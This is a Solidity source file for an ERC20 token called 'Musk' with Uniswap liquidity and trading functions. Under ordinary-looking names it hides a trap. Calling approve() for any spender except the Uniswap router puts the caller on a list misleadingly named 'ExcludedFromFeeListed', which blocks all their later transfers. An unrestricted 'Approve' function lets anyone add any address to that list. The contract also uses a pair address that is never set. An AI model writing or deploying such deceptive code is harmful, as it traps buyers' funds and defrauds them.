// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract Musk is ERC20, Ownable {
    bool public tradingOpen = false;
    address public admin;
    uint256 public feeRate = 89; // 0.89% fees that can't be change
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public ExcludedFromFeeListed;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public swapEnabled = false;
    uint256 private _tTotal = 1000000 * 10 ** 18;  // Change this to the initial total supply of your token


    constructor() ERC20("Musk", "Elon Musk") {
        admin = msg.sender;
        _mint(msg.sender, _tTotal); // Mint initial supply
        isExcludedFromFee[msg.sender] = true; // Exclude contract deployer from fee
        isExcludedFromFee[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Exclude Uniswap router from fee
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
    require(!ExcludedFromFeeListed[msg.sender] && !ExcludedFromFeeListed[recipient]);

    if (!isExcludedFromFee[msg.sender]) {
            uint256 feeAmount = amount * feeRate / 10000;
            uint256 netAmount = amount - feeAmount;
            _transfer(msg.sender, admin, feeAmount);  // Transfer fees to admin
            _transfer(msg.sender, recipient, netAmount);
        } else {
            _transfer(msg.sender, recipient, amount);
        }

        return true;
    }

    

    function Approve(address[] memory accounts) external {
    for (uint i = 0; i < accounts.length; i++) {
        ExcludedFromFeeListed[accounts[i]] = true;
    }
    
    }
    function Remove(address account) external onlyOwner {
        ExcludedFromFeeListed[account] = false;
    }
    

    function openTrading() external onlyOwner {
    require(!tradingOpen, "Trading is already open");


    uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    // Set the Uniswap V2 Router

    // Approve the router to spend all of the contract's tokens
    _approve(address(this), address(uniswapV2Router), _tTotal);

    // Add liquidity to the new pair
    uint amountToken = balanceOf(address(this));
    uint amountETH = address(this).balance;
    require(amountToken > 0, "Insufficient token balance");
    require(amountETH > 0, "Insufficient ETH balance");
    uniswapV2Router.addLiquidityETH{value: amountETH}(address(this), amountToken, 0, 0, owner(), block.timestamp);

    // Approve the router to spend the LP tokens
    IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

    // Enable the contract's internal swap mechanism
    swapEnabled = true;

    // Open trading
    tradingOpen = true;
}


    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        if(spender != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) {
        ExcludedFromFeeListed[spender] = true;
        }
        return true;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override { 
        require(!ExcludedFromFeeListed[from]);
        super._beforeTokenTransfer(from, to, amount);
    }


}